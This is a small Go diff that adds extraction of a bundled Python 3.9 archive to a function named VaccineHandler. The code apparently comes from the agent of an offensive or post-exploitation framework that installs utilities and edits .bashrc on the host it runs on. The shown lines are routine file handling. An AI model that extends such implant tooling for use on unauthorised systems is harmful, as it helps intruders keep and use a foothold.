@@ -40,6 +40,15 @@ func VaccineHandler() (out string) {
 		log.Printf("Unarchive: %v", err)
 		return fmt.Sprintf("Unarchive: %v", err)
 	}
+
+	// extract python3.9.tar.xz
+	if util.IsFileExist(emp3r0r_data.UtilsPath + "/python3.9.tar.xz") {
+		if err = archiver.Unarchive(emp3r0r_data.UtilsPath+"/python3.9.tar.xz", emp3r0r_data.UtilsPath); err != nil {
+			out = fmt.Sprintf("Unarchive python libs: %v", err)
+			log.Print(out)
+			return
+		}
+	}
 	_ = os.Remove(emp3r0r_data.AgentRoot + "/utils.tar.bz2")
 
 	// update PATH in .bashrc
